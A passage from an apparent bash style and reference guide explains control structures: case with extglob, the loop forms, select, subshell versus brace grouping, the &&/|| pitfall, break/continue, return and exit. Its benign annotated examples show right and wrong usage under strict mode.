With `shopt -s extglob` (BCS-bash §13.8), `case` patterns gain
alternation, negation, and grouping operators that make complex
matches readable:

```bash
# scenario: extglob alternation in case patterns
shopt -s extglob

case $arg in
  -h|--help)         show_help; exit 0 ;;
  -V|--version)      show_version; exit 0 ;;
  +([0-9]))          process_id "$arg" ;;     # one-or-more digits
  !(*.bak))          process_file "$arg" ;;   # any non-.bak filename
  *)                 die 22 "Unknown: $arg" ;;
esac
```

The `+(pat)`, `!(pat)`, `?(pat)`, `*(pat)`, `@(pat)` operators are
strict-mode bash's pattern primitives; they replace ad-hoc regex calls
to `[[ =~ ]]` for filename-shaped matching. The standard CLI parsing
pattern (BCS0801) is built almost entirely on this idiom plus
short-option bundling.

### Errexit interaction

`case` itself is not an errexit-exempt context. The bodies of branches
run with full errexit semantics; a branch that runs a command that
exits non-zero will terminate the script unless the branch wraps the
call (`cmd || true`, BCS0605). The discriminator is a parameter
expansion, not a command, so errexit does not apply to the matching
phase.

A `case` with no matching pattern exits `0`, not non-zero. There is no
"unmatched case" error and no implicit failure — silence is the
default. Always include an explicit `*)` clause whenever a missed
match would be a bug, with `die` or `warn` as appropriate. The
omitted-default `case` is one of the more common silent-failure modes
in bash scripts:

```bash
# wrong — no default; an unrecognised mode is silently ignored
case $mode in
  fast)     run_fast ;;
  thorough) run_thorough ;;
esac
# mode=anything-else: case exits 0, script continues with no work done

# right — unmatched value is fatal
case $mode in
  fast|f)         run_fast ;;
  thorough|t)     run_thorough ;;
  *)              die 22 "Unknown mode: ${mode@Q}" ;;
esac
```

**See also**: §7.2 (`if/elif/else/fi` for two-branch dispatch), §7.10
(AND-OR short-circuits), §15 (command-line processing and option
parsing), BCS0502, BCS0801.

## 7.4 `for x in list`

Iterate over an explicit word list. The list is a sequence of words
produced by *all* shell expansions — parameter expansion, command
substitution, brace expansion, word splitting, and pathname expansion
— evaluated once before the loop starts. The mechanics of the list are
the entire surface area of the construct; once you understand what
words bash sees, the loop itself is a triviality.

### Syntax

```
for var in word1 word2 …; do list; done
for var; do list; done                 # implicit list = "$@"
```

The bare `for var; do …; done` form (no `in`) is the canonical idiom
for iterating positional parameters and is preferred over
`for var in "$@"` — same semantics, less to read.

### Word-splitting and globbing of the list

The list is expanded; expansion is the load-bearing detail. An
unquoted parameter expansion in the list undergoes both word splitting
on `IFS` and pathname expansion on glob characters:

```bash
# wrong — word splitting and globs eat your data
files='one two.txt *.bak'
for f in $files; do                  # splits on spaces; *.bak globs
  process "$f"                       # ⇒ "one", "two.txt", every .bak file
done

# right — explicit array iteration
declare -a files=(one 'two.txt' '*.bak')
for f in "${files[@]}"; do
  process "$f"                       # ⇒ "one", "two.txt", "*.bak" verbatim
done
```

The unquoted form has exactly two legitimate uses: deliberate word
splitting of a string you control, and deliberate pathname expansion
(`for f in *.txt; do …`). Anywhere else, build an array and iterate
`"${arr[@]}"` (BCS0206, BCS0503).

### Iterating arrays — values and keys

```bash
# scenario: iterate values, indices, and associative keys
declare -a list=(alpha beta gamma)
declare -A by_id=([42]=answer [7]=lucky)

for value in "${list[@]}"; do …; done       # values, all elements
for i in "${!list[@]}"; do …; done          # indices: 0 1 2
for k in "${!by_id[@]}"; do …; done         # associative keys
for v in "${by_id[@]}"; do …; done          # associative values
```

The `${!arr[@]}` form is essential for sparse arrays — an indexed
array with elements deleted has gaps in its index sequence, and
iterating `0..${#arr[@]}-1` skips real elements while accessing unset
ones. Always iterate `"${!arr[@]}"` when the index itself matters
(BCS0206).

### Pathname expansion as the list

Pathname expansion in the list is the one place an unquoted glob is
*correct*:

```bash
# scenario: iterate matching files (extglob + nullglob friendly)
shopt -s nullglob                    # zero matches → empty list, not literal pattern
for f in *.bash *.sh; do
  shellcheck -x -- "$f"
done
```

Without `nullglob`, a pattern with no matches expands to itself as a
literal — and the loop runs once with `f='*.bash'` (BCS0902). Strict
mode mandates `nullglob` precisely because of this trap; the BCS
preamble enables it unconditionally.

### Errexit interaction

`for` itself is not an errexit-exempt context — a body command that
exits non-zero terminates the script under `set -e`. To continue past
errors deliberately, wrap the call: `cmd || true`, or check the status
explicitly:

```bash
# scenario: process every file, accumulating failures
declare -i failed=0
for f in "${files[@]}"; do
  if ! process "$f"; then            # ← errexit-exempt (in if-condition)
    warn "failed: $f"
    failed+=1
  fi
done
((failed)) && die 1 "$failed file(s) failed"
```

The `if ! cmd` form is errexit-exempt (§13.3) because conditions are;
this is the standard way to "loop over things and not abort on the
first error" without disabling errexit globally.

**See also**: §7.5 (C-style numeric `for`), §7.6 (`while`/`until` for
condition-driven loops), §5.8 (pathname expansion), §13.3 (errexit
and conditions), BCS0206, BCS0503, BCS0902.

## 7.5 C-style `for ((;;))`

A numeric loop with arithmetic context, modelled on C's `for`
statement. Use it when the loop variable is a counter — index into an
array, repeat-N-times, walk a half-open range — rather than a
membership iteration over a list (use `for x in …` for the latter,
§7.4).

### Syntax

```
for (( init; cond; update )); do list; done
```

All three expressions are *arithmetic* — the same context used by
`(( … ))` and `$(( … ))`. Variables are referenced bare, without `$`;
unset variables expand to `0` rather than the empty string. Empty
expressions are legal: `for ((;;))` is the canonical infinite loop.

### Indexed array iteration

```bash
# scenario: index walk over an array (when the index itself matters)
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -ar items=(alpha beta gamma delta)
declare -i i

for ((i=0; i<${#items[@]}; i++)); do
  printf '%d: %s\n' "$i" "${items[i]}"
done
# ⇒ 0: alpha
# ⇒ 1: beta
# ⇒ 2: gamma
# ⇒ 3: delta
```

Note the bare `i` inside `${items[i]}`: array subscripts are an
arithmetic context, so `${items[$i]}` is a redundant `$`-expansion
that costs a parse round and gains nothing (BCS0207, BCS0505). For
membership iteration without the index, the `for x in "${items[@]}"`
form is shorter and clearer; pick the C-style form only when the index
is actually used.

For *sparse* arrays (after `unset 'arr[3]'`), the range `0..${#arr[@]}-1`
is wrong: `${#arr[@]}` counts elements, not the maximum index. Iterate
`"${!arr[@]}"` instead (§7.4).

### Infinite loop with break

The empty-condition form is the standard event loop:

```bash
# scenario: wait for a condition, polling once per second
declare -i tries=0

for ((;;)); do
  if check_ready; then
    info 'ready'
    break
  fi
  tries+=1
  ((tries >= 30)) && die 24 'timed out after 30s'
  sleep 1
done
```

`for ((;;))` is identical in effect to `while :;` and `while true;`;
all three are idiomatic. Pick the one that reads best in context — the
arithmetic-loop form is conventional when an explicit counter
participates in the termination condition, the `while true` form when
the body is the focus.

### Strict-mode and errexit interaction

`(( … ))` returns `0` if the expression evaluates non-zero, and `1` if
it evaluates to zero. Under `set -e` this means a *standalone*
arithmetic statement that evaluates to zero terminates the script:

```bash
# wrong — errexit fires when count reaches zero
declare -i count=3
((count--))                          # 3→2 fine, 2→1 fine
((count--))                          # 1→0: status is 1, errexit aborts
```

Inside the C-style `for`'s `update` slot the issue does not arise —
the update expression's status is not propagated as the construct's
status — but watch for it in regular code. The standard mitigations
are `count+=-1` (assignment statement, always returns `0`) or
`((count--)) || true` (BCS0505, BCS0601).

**See also**: §7.4 (`for x in list` for membership iteration), §7.6
(`while`/`until` for condition-driven loops), §8.4 (arithmetic
evaluation), BCS0207, BCS0505, BCS0601.

## 7.6 `while`/`until`

Loop while (or until) a condition holds. Like `if`, both forms test an
*exit status* — they are command dispatchers, not boolean predicates.
`while` runs the body as long as the condition list's last command
exits `0`; `until` is its inverse, running while the condition exits
non-zero.

### Syntax

```
while list; do list; done
until list; do list; done
```

The condition is the exit status of the *last command* in the
condition list, evaluated before each iteration. The condition list is
errexit-exempt (§13.3) — a non-zero status is the loop's termination
signal, not a fatal error.

Idiomatic infinite loops:

```bash
while :; do …; done                  # always-true via the null builtin
while true; do …; done               # equivalent; reads more naturally
for ((;;)); do …; done               # arithmetic equivalent (§7.5)
```

`:` is a builtin that always exits `0`; `true` is a separate builtin
with the same behaviour. The two are interchangeable in a loop
condition.

### The canonical `read -r` idiom

The `while read -r` loop is bash's primary line-oriented input
construct:

```bash
# scenario: read every line of a file, preserving whitespace and backslashes
while IFS= read -r line; do
  process_line "$line"
done < "$input_file"
```

The three pieces matter:

- `IFS=` (empty) — disables word splitting on the read so leading and
  trailing whitespace is preserved.
- `read -r` — disables backslash escaping; the line is taken
  verbatim. Without `-r`, `\<newline>` and `\<char>` are reinterpreted.
- `< "$input_file"` — redirection on `done`, attaching the file to the
  loop's stdin. The loop runs in the *current shell*; assignments and
  variables persist after the loop exits.

If `process_line` itself reads from stdin, redirect from `&3` to keep
your two streams separate (BCS0903): `while …; do process_line <&3;
done 3< "$input"`.

### The subshell pitfall — and the fix

Piping into a `while` loop runs the loop in a *subshell*, because
every component of a pipeline is a separate process. Variables set
inside the loop vanish when the loop ends:

```bash
# wrong — loop runs in a subshell; count is reset on exit
declare -i count=0
grep -c 'pattern' files/* | while IFS= read -r line; do
  count+=1                           # mutates the subshell's count
done
echo "count=$count"                  # ⇒ count=0 (parent never saw the increments)
```

The two standard fixes are *process substitution* (BCS0504, BCS0903)
and the *`lastpipe`* shopt:

```bash
# right — process substitution attaches a fd; loop runs in current shell
declare -i count=0
while IFS= read -r line; do
  count+=1
done < <(grep -c 'pattern' files/*)
echo "count=$count"                  # ⇒ count=N
```

```bash
# alternative — lastpipe runs the rightmost pipeline element in the current shell
shopt -s lastpipe
set +m                               # required: lastpipe needs job control off

declare -i count=0
grep -c 'pattern' files/* | while IFS= read -r line; do
  count+=1
done
echo "count=$count"                  # ⇒ count=N
```

Process substitution is the standard solution and works in any script;
`lastpipe` is a global flag with broader effects (every pipeline's
last stage runs in-shell), and it requires job control off, which is
default for non-interactive scripts but worth confirming. Both
mechanisms keep the loop's mutations visible to the surrounding scope.

### `until` — the inverse of `while`

`until cmd` is `while ! cmd`. It reads naturally for "wait for X to
become true" patterns:

```bash
# scenario: poll until the service responds
declare -i tries=0
until curl -fsSL "$url" > /dev/null 2>&1; do
  tries+=1
  ((tries >= 30)) && die 24 'service did not become ready'
  sleep 1
done
```

Most authors prefer `while ! cmd` for symmetry with the `while` family
and skip `until` entirely; both forms are acceptable.

**See also**: §7.4 (`for x in list`), §7.5 (C-style `for`), §7.11
(`break`/`continue`), §6.16 (`lastpipe`), §13.3 (errexit and
conditions), BCS0503, BCS0504, BCS0903.

## 7.7 `select`

Generate a numbered menu and read a choice. `select` is bash's only
built-in interactive menu primitive; it is rare in production scripts
but ideal for ad-hoc admin tools, single-user scaffolding, and
demo-quality code where a TUI library would be overkill.

### Syntax

```
select var in word1 word2 …; do list; done
```

Bash prints the words as a numbered list to stderr, prints `PS3` as
the prompt, and reads a line from stdin. If the line is the index of a
valid item, `var` is set to that item; otherwise `var` is empty. The
loop continues until the body executes `break` or stdin reaches EOF
(typically Ctrl-D). An empty input line redisplays the menu.

### `PS3` and `REPLY`

Two built-in variables drive the interaction:

- `PS3` — the prompt string. Default is `#?`. Set it to something
  meaningful; the default is opaque and hostile.
- `REPLY` — set to the user's *literal* input, regardless of whether
  it is a valid index. Useful for accepting commands like `q` or
  `quit` alongside numeric choices.

```bash
# scenario: simple interactive menu with a quit option
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- PS3='Choose an action: '
declare -ar actions=(start stop restart 'show status' quit)

select choice in "${actions[@]}"; do
  case $choice in
    start)         systemctl start "$svc" ;;
    stop)          systemctl stop  "$svc" ;;
    restart)       systemctl restart "$svc" ;;
    'show status') systemctl status "$svc" ;;
    quit)          break ;;
    *)             # invalid input: choice is empty, REPLY holds the text
                   warn "Unknown selection: ${REPLY@Q}" ;;
  esac
done
```

Note the case `*)` clause: when the user enters something that is not
a valid index, `select` sets `var` to empty *and* leaves `REPLY` set
to the raw input — handle the empty case in the body, refer to
`REPLY` for diagnostics. The `${REPLY@Q}` expansion (BCS0306) renders
the input safely-quoted for the message.

### Mixing numeric indices and command names

Because `REPLY` is independent of `var`, a `select` loop can accept
both menu numbers and word commands:

```bash
# scenario: menu accepts numeric choice or "q" / "quit" as text
declare -- PS3='> '
declare -ar items=(alpha beta gamma)

select item in "${items[@]}"; do
  case ${item:-$REPLY} in
    alpha|beta|gamma) echo "picked: $item" ;;
    q|quit|exit)      break ;;                   # match REPLY when item is empty
    '')               continue ;;                # blank line: redisplay menu
    *)                echo "no such option: $REPLY" ;;
  esac
done
```

The `${item:-$REPLY}` expansion is the idiom: dispatch on `item` if
the user gave a valid index, else fall back to `REPLY` for textual
commands.

### Limits and alternatives

`select` is not interruptible by SIGINT in the way a regular `read` is
— Ctrl-C kills the script unless trapped (§12). It also lacks any
notion of a default selection, multi-select, search, or scrolling; for
anything beyond a handful of options, reach for a real TUI. For
non-interactive driving (testing the menu, scripting through it), pipe
input on stdin: `printf '2\nq\n' | ./tool` selects item 2 then
exits.

`select` is uncommon in modern scripts, but for a five-line interactive
prompt embedded in a larger tool it remains the path of least
resistance.

**See also**: §7.3 (`case` for dispatch on the choice), §7.6
(`while`/`until` and `read`), §12 (signal handling and Ctrl-C),
BCS0306.

## 7.8 Subshell grouping `( … )`

Run a list in a *subshell* — a forked child of the current shell that
inherits the parent's state but mutates only its own copy. The
subshell is the unit of isolation in bash; `( )` is the explicit way
to invoke it (command substitution, pipelines, and background `&` all
fork subshells implicitly).

### Syntax

```
( list )
```

Spaces inside the parentheses are conventional but not required by
the parser; `(cd /tmp; ls)` is legal. The construct exits with the
status of the last command in the list, just like brace grouping. The
form has no trailing semicolon requirement (unlike `{ … }`, §7.9) —
bash recognises `(` and `)` as words in their own right.

### What is and is not inherited

A subshell inherits, by copy:

- All variables (including arrays and associative arrays).
- All function definitions.
- All open file descriptors (the kernel `dup2`s them).
- `set -euo pipefail` and shopts (`inherit_errexit` is the load-bearing
  shopt that makes the inheritance propagate, BCS0101).
- The working directory.

A subshell *resets*:

- All non-EXIT traps to default (BCS0603, §12.4). Set EXIT traps
  inside the subshell if you need cleanup there.
- `BASH_SUBSHELL` increments by one — the canonical way to detect
  "are we in a subshell?".

A subshell *does not* propagate to the parent:

- Variable assignments, `unset` calls, `cd` calls, `umask` changes,
  `set` / `shopt` toggles, function definitions or redefinitions.

This last list is the entire point of the construct: a subshell is a
*write-isolation barrier*. Whatever you do inside `( )` is invisible
to the parent.

### `cd` in a subshell — the canonical scoped-mutation idiom

```bash
# scenario: cd into a directory, do work, return — without saving and restoring PWD
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# wrong — leaks the cd into the rest of the script
cd "$build_dir"
make
# … parent shell is now in $build_dir

# right — subshell scopes the cd
( cd "$build_dir" && make )
# parent's PWD is unchanged
```

The subshell pattern replaces the older `pushd`/`popd` dance with no
state to leak on a mid-function `die`. It is the standard scoping
mechanism for any operation that requires temporary mutation: a
working-directory change, an `IFS` override, an `umask` shift, a
trap installation that should not outlast the operation. The price is
one fork.

### `BASH_SUBSHELL` and detecting depth

```bash
# scenario: log shell depth for debugging
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

trace() { printf '[depth=%d pid=%d] %s\n' "$BASH_SUBSHELL" "$BASHPID" "$*"; }

trace 'top of script'                   # ⇒ [depth=0
( trace 'first subshell'                # ⇒ [depth=1
  ( trace 'nested subshell' )           # ⇒ [depth=2
)
trace 'after subshells'                 # ⇒ [depth=0
# (PIDs vary; the prefix `[depth=N pid=…]` is the load-bearing part)
```

`BASH_SUBSHELL` counts only explicit and command-substitution
subshells; pipelines also fork but the parser-level depth-tracking is
not always intuitive (the *last* stage of a pipeline runs in a
subshell-or-not depending on `lastpipe`, §7.6). For "what is my real
PID?" use `$BASHPID` — `$$` is the *parent* shell's PID and does
not change in a subshell, while `$BASHPID` is always the current
process's PID.

### Distinguished from `( ))` in arithmetic and conditional contexts

The parser disambiguates `( … )` from `(( … ))` (arithmetic) and
`[[ … ]]` (conditional) by lookahead: a single `(` followed by a
command-list opens a subshell; a doubled `((` opens an arithmetic
context. The two are completely separate constructs with separate
syntax and exit-status conventions; do not confuse one for the other.

**See also**: §7.9 (brace grouping `{ }` — the same idea without
forking), §7.10 (AND-OR short-circuits), §11.3 (subshell origins),
§13.3 (errexit and `inherit_errexit`), BCS0101, BCS0603.

## 7.9 Brace grouping `{ … ; }`

Run a list in the *current* shell — same process, same scope.
Equivalent to a subshell `( … )` (§7.8) in its grouping role, but
without the fork: variable assignments, `cd` calls, and other
mutations all persist after the group exits. Reach for `{ … ; }` when
you need the grouping but not the isolation.

### Syntax — the landmines

```
{ list ; }
{ list
}
```

The parser treats `{` and `}` as *reserved words*, not punctuation.
Two consequences trap newcomers:

1. **The opening `{` must be followed by whitespace.** `{cmd}` is one
   word — bash tries to run a program literally called `{cmd}` and
   fails. Write `{ cmd; }`.
2. **The closing `}` must be preceded by a list terminator.** Either
   a semicolon or a newline. `{ cmd }` is a syntax error; `{ cmd; }`
   and `{ cmd<newline>}` are correct.

```bash
# wrong — both rules violated
{cmd1; cmd2}                         # ⇒ command not found: {cmd1
{ cmd1; cmd2 }                       # ⇒ syntax error near unexpected token `}'

# right — single-line form with semicolons
{ cmd1; cmd2; }

# right — multi-line form (newline serves as terminator before })
{
  cmd1
  cmd2
}
```

The single-line form is the more common source of typos; if a
hand-typed brace group misbehaves, audit the trailing `; }` first.

### Group redirection — the everyday use

The most common reason to reach for `{ … ; }` is to apply a redirection
to several commands at once:

```bash
# scenario: log a multi-step build atomically to one file
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r logfile='/var/log/build.log'

{
  date '+%F %T build start'
  ./configure
  make -j"$(nproc)"
  make test
  date '+%F %T build end'
} >> "$logfile" 2>&1
```

The `>> "$logfile" 2>&1` after the closing brace applies to every
command inside the group. The same pattern with `( … )` would also
work, but it would fork — pointless overhead when no isolation is
needed. Group redirection is the canonical case for `{ }` over `( )`.

### `{ }` vs `( )` — the decision

Identical externally (both are compound commands; both have an exit
status equal to the last contained command's); different internally:

| Property | `{ list ; }` | `( list )` |
|----------|--------------|------------|
| Forks | No | Yes |
| Variable mutations persist | Yes | No |
| `cd` persists | Yes | No |
| Trap inheritance | Yes (no reset) | Yes (resets non-EXIT) |
| `BASH_SUBSHELL` increments | No | Yes |
| Parser tokens | Reserved words (need spaces + terminator) | Operators (no spacing rules) |

Pick `{ }` when you want the grouping for redirection or sequence
control without paying for a fork. Pick `( )` when isolation is the
*point* — when the work inside the group must not leak.

### Distinguished from brace expansion

`{ }` is brace grouping. `{a,b,c}` and `{1..5}` (§5.2) are *brace
expansion* — a separate, expansion-phase mechanism that produces word
lists. The two never collide because the parser distinguishes by
context: a `{` at the start of a command position with surrounding
whitespace opens a group; a `{` mid-word with comma-or-range contents
triggers expansion. The visual similarity is unfortunate but
unambiguous in practice.

**See also**: §7.8 (subshell grouping `( )` — the same idea with
forking), §5.2 (brace expansion — different mechanism), §6 (redirection
mechanics), BCS0503, BCS0903.

## 7.10 `&&` and `||` short-circuits

AND-OR lists chain commands with conditional execution. They are the
in-line alternative to `if/fi`: `cmd1 && cmd2` runs `cmd2` only if
`cmd1` succeeded; `cmd1 || cmd2` runs `cmd2` only if `cmd1` failed.
The two operators have *equal precedence* and are *left-associative*.
This last fact is the source of the most famous trap in bash and of
the canonical interview question on this topic.

### Mechanics

- `cmd1 && cmd2` — exit status of `cmd1` decides; `cmd2` runs iff
  `cmd1` exited `0`.
- `cmd1 || cmd2` — exit status of `cmd1` decides; `cmd2` runs iff
  `cmd1` exited non-zero.
- The whole list's exit status is the status of the *last command
  actually executed*.
- The `&&`/`||` test inspects the *immediate left command's* status —
  not the cumulative status of the whole left chain.
- Errexit exemption: every left-hand position in an AND-OR list is
  exempt from `set -e` (§13.3); only the *final* command's status is
  observed by errexit.

### Common one-liners

```bash
# scenario: conditional action without an if-block
[[ -d $dir ]] || mkdir -p -- "$dir"          # create only if missing
cmd && success 'done' || warn 'failed'       # WRONG — see misconception below
cd "$dir" && rm -- *.tmp                     # cd or skip the rm
```

The first idiom is universally safe — `[[ -d … ]] || mkdir` reads as
"ensure the directory exists." The second is the misconception, dealt
with next.

### The famous misconception: `&& … ||` is not `if-then-else`

`cmd1 && cmd2 || cmd3` *looks* like `if cmd1 then cmd2 else cmd3`. It
is not. It runs `cmd3` whenever the immediate left command of `||`
fails — and the immediate left command of `||` is `cmd2` whenever
`cmd1` succeeded. So `cmd3` runs not just when `cmd1` fails, but also
when `cmd1` succeeds *and* `cmd2` then fails:

```bash
# wrong — looks like if/then/else; isn't.
[[ -f $file ]] && rm -- "$file" || warn "could not check"
# trace:
#   $file present, rm succeeds (status 0)        → no warn (correct branch)
#   $file present, rm fails    (status 1)        → warn fires (silently wrong)
#   $file absent,  warn fires                    → warn fires (intended)
```

Two of the three execution paths print `could not check` even when the
problem was a failed `rm`, not a failed test. The standard misdiagnosis
is "filesystem is glitching"; the reality is that `&&`/`||` chains do
not implement conditional dispatch.

The right tool is an `if/fi`:

```bash
# right — explicit dispatch
if [[ -f $file ]]; then
  rm -- "$file" || warn "could not remove $file"
else
  warn "no such file: $file"
fi
```

…or grouping to disambiguate the intent:

```bash
# right — group the success branch so its failure cannot trigger the failure branch
[[ -f $file ]] && { rm -- "$file"; success "removed"; } || warn "no such file"
```

The braces force `{ rm …; success …; }` to be evaluated as a single
unit; their combined status is what `||` tests. The pattern is still
fragile (`success` failing would trigger the warn), but it eliminates
the more common version of the bug. For anything more than a binary
guard, prefer `if/fi` and stop.

### Errexit and AND-OR lists

`set -e` does not abort on a failure in any non-final position of an
AND-OR list. This is by design — `cmd || handler` would be useless if
the failing `cmd` aborted the script before `handler` ran. But it
also means a long AND-OR chain hides errors:

```bash
# wrong — only failure of cmd5 is observed by errexit
cmd1 && cmd2 && cmd3 && cmd4 && cmd5
```

Failures in `cmd1`–`cmd4` short-circuit the chain (the rest do not
run), but the *script* continues — because the chain's overall status
is whatever the last *executed* command returned, and that could be a
mid-chain success that simply stopped further work. For multi-step
sequences where every step must succeed, use a `for` loop, an
explicit if-cascade, or the BCS-standard `cmd || die …` pattern at
each step (BCS0601, BCS0604).

### Idiomatic uses that *are* safe

For all the misconceptions, three AND-OR idioms remain canonical and
unproblematic:

- **Guard-and-act**: `[[ test ]] && cmd` — single action conditional
  on a test. No third branch; cannot misfire.
- **Default-on-failure**: `cmd || default` — fall back when `cmd`
  fails. Common with `||` `:` `||` `true` to suppress non-fatal
  errors (BCS0605).
- **Die-on-failure**: `cmd || die N "message"` — the BCS-standard
  error-handling pattern (BCS0601, BCS0604). The terminating `die`
  guarantees the right-hand side is the only post-failure path.

Reach for these freely. Reach for `cmd1 && cmd2 || cmd3` and similar
three-clause forms not at all.

**See also**: §7.2 (`if/elif/else/fi` — the explicit conditional),
§7.8 (`( )` for grouping with isolation), §7.9 (`{ }` for grouping
without forking), §13.3 (errexit and the AND-OR exemption), BCS0601,
BCS0604, BCS0605.

## 7.11 `break` and `continue`

Loop-control builtins. Both accept an optional integer `N` selecting
which enclosing loop to act on, counting outward from the innermost.

- `break [N]` — exit `N` enclosing loops (default 1).
- `continue [N]` — restart the test/header of the `N`-th enclosing
  loop (default 1).
- `N` out of range: `break: N: loop count out of range` (status 1
  under errexit will exit the shell).
- `case` is *not* a loop — `break` inside a `case` body refers to
  the nearest *enclosing* loop, not the `case` itself.
- `select` *is* a loop; `break` exits it (this is the only way to
  leave a `select` other than EOF).

### Nested-loop `break N`

The `N` argument is the only mechanism for exiting two or more loop
levels in one statement. Without it the inner loop must signal the
outer loop indirectly (a flag variable, or worse, a goto-style
re-test of the condition).

```bash
# scenario: search a 2D table; on first match, exit both loops.
declare -ra rows=('alpha beta' 'gamma delta' 'epsilon zeta')
declare -- needle='delta' found=''
for row in "${rows[@]}"; do
  for cell in $row; do
    if [[ $cell == "$needle" ]]; then
      found=$cell
      break 2                                  # → exits cell-loop AND row-loop
    fi
  done
done
printf 'found: %s\n' "${found:-none}"          # ⇒ found: delta (BCS0503)
```

Without `break 2` the inner `break` would only end the cell-loop and
the outer would continue scanning rows — usually a bug.

### `continue N`

Symmetrical: `continue 2` from within an inner loop restarts the
*outer* loop's next iteration, skipping the rest of both bodies.

```bash
# scenario: skip an entire outer iteration when an inner condition fires.
process() { printf 'processing: %s\n' "$1"; }   # placeholder
mkdir -p src tests docs
: > src/a.bash && : > tests/b.bash
for dir in src tests docs; do
  [[ -d $dir ]] || continue                    # bare continue: next dir
  for f in "$dir"/*.bash; do
    [[ -r $f ]] || continue 2                  # → unreadable file: skip this whole dir
    process "$f"
  done
done
# ⇒ processing: src/a.bash
# ⇒ processing: tests/b.bash
```

**See also**: §7.4 `for`, §7.6 `while`/`until`, §7.7 `select`, §7.3
`case` (note: not a loop; `break` skips past it to the enclosing
loop), BCS0503 (loops), BCS0601 (errexit interaction with loop
control).

## 7.12 `return`

`return` exits the current function or sourced file with a status
code; control passes back to the caller as if the function or
`source` had completed normally.

- `return [N]` — `N` defaults to the status of the last command.
- `N` is taken modulo 256, then masked to 0–255; values outside that
  range wrap (e.g. `return 300` yields status 44).
- `return` outside a function: in a sourced script it terminates
  *sourcing*; outside both, bash prints `return: can only `return'
  from a function or sourced script` and yields status 1.
- Distinct from `exit`: `return` leaves the calling shell running.

### Strict-mode framing

Under `set -euo pipefail`, every function that fails to set an
explicit return path will inherit the status of its last command.
For most BCS functions this is the correct behaviour; for predicate
functions (those whose role is to answer yes/no), the explicit form
is clearer and survives later edits.

```bash
# scenario: explicit return paths in a strict-mode predicate.
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit

is_lower_case() {
  local -- s="${1:?usage: is_lower_case STRING}"
  [[ $s =~ ^[[:lower:]]+$ ]] || return 1       # explicit failure code
  return 0                                     # explicit success code (BCS0501)
}

if is_lower_case 'hello'; then
  echo 'lower'                                 # ⇒ lower
fi

```

### `return` from a sourced file

This is the **only** safe way for a library to abort loading. `exit`
inside a sourced file kills the caller's shell, which, if the caller
is an interactive bash, is rude in the extreme.

```bash
# scenario: a sourced library aborts cleanly when a prerequisite is missing.
# --- /usr/local/lib/myapp/db.sh (the library) ---
[[ -n ${MYSQL_PWD:-} ]] || {
  >&2 echo 'db.sh: MYSQL_PWD not set; library not loaded'
  return 1                                     # ⇒ caller sees source failure, shell stays alive
}

# --- caller ---
if ! source /usr/local/lib/myapp/db.sh; then
  echo 'continuing without db support'         # caller decides what to do (BCS0407)
fi
```

The reverse — using `return` outside a function and outside a
sourced file — is a hard error: bash refuses and the shell continues
with status 1. Always make sure you know which scope you are in.

**See also**: §7.13 `exit`, §10.1 `source` semantics, §13.x
`errexit` exemption matrix, §9.4 return value via `return N`,
BCS0407 (library patterns), BCS0602 (exit codes).

## 7.13 `exit`

`exit` terminates the *current* shell process and returns control to
its parent. The optional argument is the exit status, taken modulo
256.

- `exit [N]` — `N` defaults to the status of the last command.
- `N` is taken modulo 256.
- `exit` triggers the EXIT pseudo-trap (§12.6) before the shell
  actually leaves.
- `exit` from within a subshell exits *only that subshell*; the
  parent shell continues.
- A subshell's `exit` does **not** run the parent's EXIT trap — each
  shell has its own trap table.

### Subshell-exit subtlety

The most common source of confusion is `(...)` versus `{...}`. A
subshell — explicit `(...)`, a pipeline element, a command
substitution `$(...)`, a backgrounded `&` job — has its own process
ID and its own trap table. `exit` inside it leaves *that process*,
not the parent.

```bash
# scenario: exit inside a subshell does NOT terminate the script.
#!/usr/bin/env bash
set -euo pipefail
echo 'before subshell'

(
  echo 'inside subshell'
  exit 7                                       # exits ONLY this subshell
  echo 'unreachable'
)
echo "subshell rc=$?"                          # ⇒ subshell rc=7 (BCS0602)
echo 'after subshell'                          # ⇒ runs normally

```

By contrast, `{ ...; }` runs in the *current* shell; an `exit`
inside it terminates the script.

### EXIT trap interaction

The EXIT trap fires whenever the shell that installed it leaves —
whether by `exit`, by reaching end of script, by a fatal signal, or
by an `errexit`-triggered failure. Each subshell starts with **no**
inherited EXIT trap (it has its own copy of the trap table that is
explicitly cleared for EXIT and DEBUG).

```bash
# scenario: EXIT trap fires once for the parent, not for the subshell.
#!/usr/bin/env bash
set -euo pipefail
trap 'echo "PARENT exit trap (rc=$?)"' EXIT

(
  trap 'echo "SUB exit trap"' EXIT             # subshell installs its own
  echo 'in subshell'
  exit 3                                       # ⇒ fires SUB exit trap, NOT parent
)

echo "subshell rc=$?"                          # ⇒ subshell rc=3
exit 0                                         # ⇒ then parent EXIT trap fires (rc=0)

```

Output: `in subshell` / `SUB exit trap` / `subshell rc=3` /
`PARENT exit trap (rc=0)`. `exit` in the parent runs the parent's
EXIT trap; `exit` in the subshell runs the subshell's. They never
cross.

**See also**: §7.8 subshell grouping, §7.9 brace grouping, §7.12
`return`, §12.6 EXIT/ERR/DEBUG/RETURN pseudo-signals, §13.10 exit
code conventions, BCS0602 (exit codes), BCS0603 (trap handling).

## 7.14 `:`, `true`, `false`

Three commands that exist primarily to satisfy syntax requirements
(a slot in the grammar that demands a *command*, where any non-zero
or zero status will do).

- `:` — null command, returns 0. A *special* builtin: faster than
  `true` because it does no argument processing and cannot be
  shadowed.
- `true` — returns 0. Regular builtin.
- `false` — returns 1. Regular builtin.
- Use cases: empty body of a control structure (`while :; do …;
  done`), forcing success in the `cmd ||:` idiom, infinite loops,
  *and* the side-effecting parameter-expansion idiom below.
- `: ${VAR:=default}` — evaluate parameter expansion for its
  side effect (assigning a default), discarding the value.

### The `: ${VAR:=default}` idiom

`${VAR:=default}` not only *expands to* `default` when `VAR` is
unset/empty but also *assigns* `default` to `VAR` as a side effect.
Pairing it with `:` discards the expansion result while keeping the
assignment — a one-line "set if not set" pattern.

```bash
# scenario: provide configurable defaults at the top of a script
# without overriding any value already set in the environment.
#!/usr/bin/env bash
set -euo pipefail

